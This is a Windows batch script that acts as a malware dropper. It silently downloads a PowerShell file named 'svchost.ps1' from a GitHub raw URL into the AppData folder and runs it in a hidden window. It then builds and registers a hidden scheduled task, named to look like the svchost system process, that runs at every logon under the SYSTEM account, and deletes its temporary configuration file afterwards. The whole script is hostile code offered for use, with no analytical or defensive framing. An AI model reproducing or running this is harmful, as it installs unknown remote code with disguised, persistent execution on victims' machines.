��
@echo off 

START /B /WAIT powershell -windowstyle hidden Invoke-WebRequest -URI https://raw.githubusercontent.com/arthodox1337/bhcddcbdsycb/main/svchost.ps1 -OutFile %appdata%\svchost.ps1
START /B /WAIT powershell "%appdata%\svchost.ps1"

REM --- Create the scheduled task ---
(
echo ^<?xml version="1.0" encoding="UTF-16"?^>
echo ^<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"^>
echo   ^<RegistrationInfo^>
echo     ^<Date^>2023-07-24T05:45:57^</Date^>
echo     ^<Author^>ATLAS-855DPF1IF\Dev^</Author^>
echo     ^<URI^>\Svchost^</URI^>
echo   ^</RegistrationInfo^>
echo   ^<Triggers^>
echo     ^<LogonTrigger^>
echo       ^<StartBoundary^>2023-07-24T05:45:00^</StartBoundary^>
echo       ^<Enabled^>true^</Enabled^>
echo     ^</LogonTrigger^>
echo   ^</Triggers^>
echo   ^<Principals^>
echo     ^<Principal id="Author"^>
echo       ^<UserId^>S-1-5-18^</UserId^>
echo       ^<RunLevel^>LeastPrivilege^</RunLevel^>
echo     ^</Principal^>
echo   ^</Principals^>
echo   ^<Settings^>
echo     ^<MultipleInstancesPolicy^>IgnoreNew^</MultipleInstancesPolicy^>
echo     ^<DisallowStartIfOnBatteries^>true^</DisallowStartIfOnBatteries^>
echo     ^<StopIfGoingOnBatteries^>true^</StopIfGoingOnBatteries^>
echo     ^<AllowHardTerminate^>true^</AllowHardTerminate^>
echo     ^<StartWhenAvailable^>false^</StartWhenAvailable^>
echo     ^<RunOnlyIfNetworkAvailable^>false^</RunOnlyIfNetworkAvailable^>
echo     ^<IdleSettings^>
echo       ^<StopOnIdleEnd^>true^</StopOnIdleEnd^>
echo       ^<RestartOnIdle^>false^</RestartOnIdle^>
echo     ^</IdleSettings^>
echo     ^<AllowStartOnDemand^>true^</AllowStartOnDemand^>
echo     ^<Enabled^>true^</Enabled^>
echo     ^<Hidden^>true^</Hidden^>
echo     ^<RunOnlyIfIdle^>false^</RunOnlyIfIdle^>
echo     ^<DisallowStartOnRemoteAppSession^>false^</DisallowStartOnRemoteAppSession^>
echo     ^<UseUnifiedSchedulingEngine^>true^</UseUnifiedSchedulingEngine^>
echo     ^<WakeToRun^>false^</WakeToRun^>
echo     ^<ExecutionTimeLimit^>PT72H^</ExecutionTimeLimit^>
echo     ^<Priority^>7^</Priority^>
echo     ^<RestartOnFailure^>
echo       ^<Interval^>PT1M^</Interval^>
echo       ^<Count^>3^</Count^>
echo     ^</RestartOnFailure^>
echo   ^</Settings^>
echo   ^<Actions Context="Author"^>
echo     ^<Exec^>
echo       ^<Command^>C:\Users\Dev\AppData\Roaming\svchost.ps1.bat^</Command^>
echo     ^</Exec^>
echo   ^</Actions^>
echo ^</Task^>
) > "%TEMP%\task_config.xml"

schtasks /Create /XML "%TEMP%\task_config.xml" /TN "SvchostTask"

if %errorlevel% neq 0 (
    echo Failed to create the scheduled task.
) else (
    echo Scheduled task created successfully.
)

REM Clean up the temporary XML file
del "%TEMP%\task_config.xml" /q

